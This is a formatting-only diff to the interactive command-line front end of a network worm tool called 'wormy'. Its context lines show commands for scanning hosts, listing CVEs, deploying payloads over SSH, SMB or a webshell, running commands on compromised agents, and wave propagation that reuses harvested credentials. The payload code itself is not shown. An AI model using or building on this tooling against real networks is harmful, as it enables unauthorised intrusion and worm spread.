@@ -18,8 +18,9 @@ from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
 
-from ._version import __version__
 from utils.logger import logger
+
+from ._version import __version__
 
 console = Console()
 
@@ -42,7 +43,9 @@ class InteractiveCLI(cmd.Cmd):
     def _update_prompt(self):
         infected = len(self.worm.infected_hosts) if hasattr(self.worm, "infected_hosts") else 0
         scanned = len(self.worm.scan_results) if hasattr(self.worm, "scan_results") else 0
-        status = "[bold green]● RUNNING[/]" if getattr(self.worm, "running", False) else "[dim]○ IDLE[/]"
+        status = (
+            "[bold green]● RUNNING[/]" if getattr(self.worm, "running", False) else "[dim]○ IDLE[/]"
+        )
         self.prompt = f"\n{status}  [bold cyan]wormy[/][dim]::{infected} infected[/][dim]::{scanned} hosts[/]\n> "
 
     def _uptime(self) -> str:
@@ -153,7 +156,9 @@ class InteractiveCLI(cmd.Cmd):
                 st = "[red]FAILED[/]"
             else:
                 st = "[dim]DISCOVERED[/]"
-            t.add_row(st, ip, h.get("os_guess", "?"), ", ".join(str(p) for p in h.get("open_ports", [])))
+            t.add_row(
+                st, ip, h.get("os_guess", "?"), ", ".join(str(p) for p in h.get("open_ports", []))
+            )
         console.print(t)
         self._update_prompt()
 
@@ -195,8 +200,17 @@ class InteractiveCLI(cmd.Cmd):
                 t.add_column("CVE")
                 for v in vulns:
                     sev = v.get("severity", "?").upper()
-                    color = "red" if sev in ("CRITICAL", "HIGH") else "yellow" if sev == "MEDIUM" else "green"
-                    t.add_row(f"[{color}]{sev}[/]", v.get("name", ""), str(v.get("cvss", "")), v.get("cve", "N/A"))
+                    color = (
+                        "red"
+                        if sev in ("CRITICAL", "HIGH")
+                        else "yellow" if sev == "MEDIUM" else "green"
+                    )
+                    t.add_row(
+                        f"[{color}]{sev}[/]",
+                        v.get("name", ""),
+                        str(v.get("cvss", "")),
+                        v.get("cve", "N/A"),
+                    )
                 console.print(t)
                 return
         console.print(f"[red]Target {ip} not found[/]")
@@ -322,7 +336,9 @@ class InteractiveCLI(cmd.Cmd):
         for ip in self.worm.host_monitor.hosts:
             for lm in self.worm.host_monitor.hosts[ip].lateral_movement_history:
                 lateral.append({"source": ip, **lm})
-        results = tv.generate_all(hosts, self.worm.infected_hosts, self.worm.failed_targets, lateral)
+        results = tv.generate_all(
+            hosts, self.worm.infected_hosts, self.worm.failed_targets, lateral
+        )
         t = Table(border_style="bright_blue", title="[bold]Topology Maps[/]")
         t.add_column("Format")
         t.add_column("Path")
@@ -338,7 +354,9 @@ class InteractiveCLI(cmd.Cmd):
         """Show host details. Usage: host <ip>"""
         ip = arg.strip()
         if not ip or not self.worm.host_monitor:
-            console.print("[red]Usage: host <ip>[/]" if not ip else "[dim]Host Monitor unavailable[/]")
+            console.print(
+                "[red]Usage: host <ip>[/]" if not ip else "[dim]Host Monitor unavailable[/]"
+            )
             return
         status = self.worm.host_monitor.get_host_status(ip)
         if not status:
@@ -374,7 +392,9 @@ class InteractiveCLI(cmd.Cmd):
         t.add_column("Type")
         t.add_column("Details", max_width=50)
         for a in activities:
-            t.add_row(a["timestamp"][11:19], a["host_ip"], a["type"], str(a.get("details", ""))[:50])
+            t.add_row(
+                a["timestamp"][11:19], a["host_ip"], a["type"], str(a.get("details", ""))[:50]
+            )
         console.print(t)
 
     # ── PIVOT ────────────────────────────────────────────────────────
@@ -412,18 +432,24 @@ class InteractiveCLI(cmd.Cmd):
         ssh_ports = (22, 2222, 2200, 2022, 8022)
         for port in ports:
             if port in ssh_ports:
-                success = self.worm.payload_deployer.deploy_via_ssh(ip, port, username, password, payload_type=ptype)
+                success = self.worm.payload_deployer.deploy_via_ssh(
+                    ip, port, username, password, payload_type=ptype
+                )
                 if success:
                     break
             elif port in (445, 139):
-                success = self.worm.payload_deployer.deploy_via_smb(ip, username, password, payload_type=ptype)
+                success = self.worm.payload_deployer.deploy_via_smb(
+                    ip, username, password, payload_type=ptype
+                )
                 if success:
                     break
             elif port in (80, 443, 8080):
                 success = self.worm.payload_deployer.deploy_webshell(ip, port, username, password)
                 if success:
                     break
-        console.print(f"[green]Deploy succeeded on {ip}[/]" if success else f"[red]Deploy failed on {ip}[/]")
+        console.print(
+            f"[green]Deploy succeeded on {ip}[/]" if success else f"[red]Deploy failed on {ip}[/]"
+        )
         self._update_prompt()
 
     # ── PERSIST ──────────────────────────────────────────────────────
@@ -504,7 +530,9 @@ class InteractiveCLI(cmd.Cmd):
                 console.print(f"[red]No registered agent for {ip}[/]")
                 return
             rc, output = self.worm.agent_controller.execute_now(agent.agent_id, command)
-            console.print(f"[bold]Output from {ip}[/] (agent={agent.agent_id}, user={agent.username}, rc={rc})")
+            console.print(
+                f"[bold]Output from {ip}[/] (agent={agent.agent_id}, user={agent.username}, rc={rc})"
+            )
             console.print(output if output else "[dim](no output)[/]")
         except Exception as e:  # noqa: BLE001 — user-facing command error
             console.print(f"[red]Command failed: {e}[/]")
@@ -599,12 +627,17 @@ class InteractiveCLI(cmd.Cmd):
                 except Exception:  # noqa: BLE001 — beacon reporting is best-effort
                     pass
 
-            if self.worm.wave_propagation and iteration % 3 == 0 and len(self.worm.infected_hosts) > 1:
+            if (
+                self.worm.wave_propagation
+                and iteration % 3 == 0
+                and len(self.worm.infected_hosts) > 1
+            ):
                 try:
                     targets = [
                         h
                         for h in self.worm.scan_results
-                        if h["ip"] not in self.worm.infected_hosts and h["ip"] not in self.worm.failed_targets
+                        if h["ip"] not in self.worm.infected_hosts
+                        and h["ip"] not in self.worm.failed_targets
                     ]
                     if targets and self.worm.cred_manager:
                         creds = self.worm.cred_manager.get_discovered_credentials()
@@ -768,4 +801,3 @@ class InteractiveCLI(cmd.Cmd):
 
 # Backwards compatibility alias
 WormyCLI = InteractiveCLI
-
